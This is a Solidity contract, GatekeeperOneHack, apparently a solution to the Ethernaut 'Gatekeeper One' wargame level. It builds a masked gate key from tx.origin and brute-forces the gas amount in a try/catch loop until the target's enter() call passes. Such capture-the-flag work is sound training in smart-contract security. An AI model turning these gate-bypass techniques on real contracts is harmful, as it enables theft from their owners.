pragma solidity ^0.8.0;

import 'levels/GatekeeperOne.sol';

contract GatekeeperOneHack {
  GatekeeperOne internal gatekeeperOne;

  constructor(address _address) {
    gatekeeperOne = GatekeeperOne(_address);
  }

  function hack() external {
    uint256 gateKey = uint256(uint160(tx.origin));
    bytes8 gateKey8 = bytes8(uint64(gateKey));
    bytes8 mask = 0xFFFFFFFF0000FFFF;
    bytes8 gateKeyPadded = gateKey8 & mask;

    // @dev brute force
    for (uint256 i = 0; i < 8192; i++) {
      /// @dev try catch to avoid propagating the revert if gateTwo() fails
      try gatekeeperOne.enter{gas: 200000 + i}(gateKeyPadded) {
        break;
      } catch { }
    }
  }
}
